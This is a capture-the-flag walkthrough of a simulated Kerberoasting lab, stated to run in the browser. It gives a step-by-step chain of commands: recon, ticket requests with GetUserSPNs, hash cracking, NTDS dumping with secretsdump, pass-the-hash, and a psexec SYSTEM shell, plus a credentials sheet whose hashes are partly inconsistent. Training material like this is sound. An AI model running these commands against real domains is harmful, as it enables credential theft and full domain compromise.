# Kerberoasting CTF — Complete Attack Walkthrough

**Scenario:** You have been dropped into a Kali Linux attacker machine (10.10.10.5) on the same subnet as a Windows Active Directory domain controller at 10.10.10.10 (DC01.CORP.LOCAL). Your goal: fully compromise the domain by performing a Kerberoasting attack and escalating to Domain Admin.

---

## Challenge Overview

| # | Challenge | Points | Category |
|---|-----------|--------|----------|
| 1 | Reconnaissance: Port Scan | 100 | Recon |
| 2 | Reconnaissance: SMB Enumeration | 100 | Recon |
| 3 | Initial Access: Validate Credentials | 150 | Initial Access |
| 4 | Privilege Escalation: Find SPNs | 200 | Privilege Escalation |
| 5 | Kerberoasting: Request TGS Tickets | 250 | Credential Access |
| 6 | Credential Access: Crack TGS Hashes | 300 | Credential Access |
| 7 | Lateral Movement: Test svc_backup | 200 | Lateral Movement |
| 8 | Credential Access: Dump NTDS.dit | 400 | Credential Access |
| 9 | Privilege Escalation: Pass-the-Hash | 350 | Privilege Escalation |
| 10 | Domain Compromise: SYSTEM Shell | 500 | Impact |
| | **Total** | **2550** | |

---

## Attack Path

```
Recon (nmap, enum4linux)
  → Find credentials (notes.txt)
    → Validate with CrackMapExec
      → Kerberoast with impacket-GetUserSPNs
        → Crack hashes with john/hashcat
          → Authenticate as svc_backup
            → secretsdump (NTDS.dit)
              → Pass-the-Hash as Administrator
                → PsExec → SYSTEM
```

---

## Step 1 — Port Scan the DC

Start by enumerating what's on the network:

```bash
nmap -sn 10.10.10.0/24
```

Discover the DC IP, then run a full service scan:

```bash
nmap -sV -sC -p- 10.10.10.10
```

**Key ports to note:**
- `88/tcp` — Kerberos (confirms it's a Domain Controller)
- `389/tcp` — LDAP
- `445/tcp` — SMB (primary attack surface)
- `5985/tcp` — WinRM (remote management)

**Flag:** `FLAG{dc01_discovered_ports_445_88_389}`

---

## Step 2 — SMB Enumeration with enum4linux

```bash
enum4linux -a 10.10.10.10
```

This reveals:
- Domain: **CORP.LOCAL**
- Users: Administrator, Guest, krbtgt, john.doe, svc_backup, svc_sql, svc_web, and others
- Password policy: min length 7, lockout threshold 5
- Shares: SYSVOL, NETLOGON, IPC$

**Flag:** `FLAG{corp_local_domain_enumerated}`

---

## Step 3 — Find Initial Credentials

Check the files on your Kali machine:

```bash
cat /root/notes.txt
```

You'll find a note: `john.doe / Password1!`

Validate these credentials against the DC:

```bash
crackmapexec smb 10.10.10.10 -u john.doe -p 'Password1!'
```

Look for `[+]` — a successful authentication. `john.doe` is a standard Domain User. No `(Pwn3d!)` — but that's OK, we'll escalate.

**Flag:** `FLAG{john_doe_authenticated_smb}`

---

## Step 4 — Enumerate Service Principal Names (SPNs)

Kerberoasting exploits accounts that have **Service Principal Names (SPNs)** registered. Any domain user can request a TGS (Ticket Granting Service) ticket for these accounts — and the ticket is encrypted with the service account's password hash.

```bash
impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' -dc-ip 10.10.10.10
```

Output shows three vulnerable accounts:

| SPN | Account |
|-----|---------|
| `backup/dc01.corp.local` | svc_backup |
| `MSSQLSvc/dc01.corp.local:1433` | svc_sql |
| `HTTP/web.corp.local` | svc_web |

**Flag:** `FLAG{3_spns_found_svc_backup_svc_sql_svc_web}`

---

## Step 5 — Request TGS Tickets (Kerberoast!)

Add `-request` to actually pull the encrypted tickets:

```bash
impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' \
  -dc-ip 10.10.10.10 \
  -request \
  -outputfile hashes.kerberoast
```

You'll see three `$krb5tgs$23$*...*` blobs saved to `hashes.kerberoast`. These are RC4-encrypted (etype 23) Kerberos tickets — the weak encryption that makes Kerberoasting possible.

**Flag:** `FLAG{tgs_tickets_captured_rc4_etype23}`

---

## Step 6 — Crack the Hashes Offline

### Option A: john

```bash
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
john hashes.kerberoast --show
```

### Option B: hashcat (GPU)

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

**Cracked passwords:**

| Account | Password |
|---------|----------|
| svc_backup | `Backup2023!` |
| svc_sql | `SqlServer1!` |
| svc_web | `Welcome123` |

**Flag:** `FLAG{svc_backup_cracked_Backup2023}`

---

## Step 7 — Validate svc_backup (Backup Operators!)

```bash
crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!'
```

Notice: **no** `(Pwn3d!)` tag. But check the groups from the enumeration — `svc_backup` is in **Backup Operators**.

> **Why does this matter?** Members of Backup Operators can backup/restore any file — including the NTDS.dit database (the AD password store), even without Domain Admin privileges. This is a classic privilege escalation path.

```bash
crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!' --users
```

**Flag:** `FLAG{svc_backup_backup_operators_group}`

---

## Step 8 — Dump All Domain Hashes (secretsdump)

Use impacket-secretsdump to dump the NTDS.dit over the wire using the DRSUAPI (Directory Replication Service) protocol:

```bash
impacket-secretsdump CORP.LOCAL/svc_backup:'Backup2023!'@10.10.10.10
```

Output:

```
CORP\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
CORP\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CORP\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f3a8b2c1d4e5f6a7b8c9d0e1f2a3b4c:::
... (all domain hashes)
```

The format is: `domain\user:RID:LM_hash:NT_hash:::`

Save the Administrator hash: `fc525c9683e8fe067095ba2ddc971889`

**Flag:** `FLAG{ntds_dumped_all_domain_hashes}`

---

## Step 9 — Pass-the-Hash as Domain Admin

You don't need to crack the Administrator hash — use it directly with **Pass-the-Hash (PtH)**:

```bash
crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889
```

Look for `(Pwn3d!)` — you're now authenticated as Domain Administrator!

```bash
crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889 --users
crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889 -x whoami
```

**Flag:** `FLAG{administrator_pth_pwn3d}`

---

## Step 10 — Full Domain Compromise: SYSTEM Shell

Use impacket-psexec to spawn a SYSTEM shell on the DC:

```bash
impacket-psexec CORP.LOCAL/Administrator:'P@ssw0rd2023!'@10.10.10.10
```

Or with the NT hash:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 \
  CORP.LOCAL/Administrator@10.10.10.10
```

```
C:\Windows\system32>
[+] NT AUTHORITY\SYSTEM shell on 10.10.10.10
```

**The domain is fully compromised.** You have SYSTEM-level access on the Domain Controller.

**Flag:** `FLAG{dc01_compromised_nt_authority_system}`

---

## Full Attack Chain Summary

```
1. nmap -sV -sC 10.10.10.10
   → Found DC01.CORP.LOCAL on 10.10.10.10

2. enum4linux -a 10.10.10.10
   → Found domain users and shares

3. cat /root/notes.txt
   → john.doe:Password1!

4. crackmapexec smb 10.10.10.10 -u john.doe -p 'Password1!'
   → Valid domain creds, no admin

5. impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast
   → Got TGS tickets for svc_backup, svc_sql, svc_web

6. john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
   → svc_backup:Backup2023!

7. crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!'
   → Valid — svc_backup is in Backup Operators

8. impacket-secretsdump CORP.LOCAL/svc_backup:'Backup2023!'@10.10.10.10
   → Dumped all NTDS hashes including Administrator

9. crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889
   → (Pwn3d!) Domain Admin confirmed

10. impacket-psexec CORP.LOCAL/Administrator:'P@ssw0rd2023!'@10.10.10.10
    → NT AUTHORITY\SYSTEM — full domain compromise
```

---

## Key Concepts Explained

### What is Kerberoasting?
Kerberoasting abuses the Kerberos ticket system. Any authenticated domain user can request a TGS ticket for any SPN account. The ticket is encrypted with the service account's RC4 (NTLM) hash. An attacker can request these tickets and crack them offline — no special privileges required for the initial request.

### Why is RC4/etype 23 weak?
Modern Kerberos uses AES-256, but older environments fall back to RC4 (etype 23) which is much faster to crack. If a DC allows RC4 ticket encryption (common in legacy environments), the tickets are crackable with tools like hashcat at hundreds of thousands of hashes per second.

### What are SPNs?
Service Principal Names are identifiers registered in AD for services running under domain accounts. Common examples: `MSSQLSvc/server:1433` (SQL Server), `HTTP/web.corp.local` (IIS), `backup/dc01` (backup agent). Any account with an SPN can be Kerberoasted.

### Why is Backup Operators dangerous?
The Backup Operators group grants `SeBackupPrivilege` — the ability to read any file regardless of ACL. This lets members extract NTDS.dit (the AD database) and the SYSTEM registry hive, then dump all password hashes offline using tools like secretsdump.

### What is Pass-the-Hash?
NT hashes (NTLM) can be used directly for authentication without knowing the plaintext password. This is because NTLM authentication works by proving knowledge of the NT hash, not the cleartext password. PtH is effective on SMB, WinRM, and other protocols.

---

## Tools Reference

| Tool | Purpose | Key Flag |
|------|---------|----------|
| `nmap` | Port scan + service detection | `-sV -sC` |
| `enum4linux` | SMB/Windows enumeration | `-a` (all) |
| `crackmapexec` | SMB auth + lateral movement | `-u -p` / `-H` for PtH |
| `impacket-GetUserSPNs` | Kerberoast — enumerate and request tickets | `-request -outputfile` |
| `john` | Offline password cracking | `--wordlist` |
| `hashcat` | GPU-accelerated cracking | `-m 13100` for Kerberoast |
| `impacket-secretsdump` | Dump NTDS.dit / LSA secrets | — |
| `impacket-psexec` | Remote SYSTEM shell via SMB | `-hashes` for PtH |
| `kerbrute` | Kerberos user enumeration | `userenum` |
| `hydra` | Brute-force/spraying | `-l/-L -p/-P` |

---

## Credentials Sheet

| Account | Password | NT Hash | Privilege |
|---------|----------|---------|-----------|
| john.doe | Password1! | 31d6cfe0d16ae931b73c59d7e0c089c0 | Domain User |
| svc_backup | Backup2023! | 8c802621d2e36fc074345dded890f3e5 | Backup Operators |
| svc_sql | SqlServer1! | f4c5e53a5e66f1c6e1c6d57f6eac2f5a | Domain User |
| svc_web | Welcome123 | e10adc3949ba59abbe56e057f20f883e | Domain User |
| Administrator | P@ssw0rd2023! | fc525c9683e8fe067095ba2ddc971889 | Domain Admin |

---

*This CTF runs entirely in your browser — no real connections are made. All credentials, hashes, and network activity are simulated.*
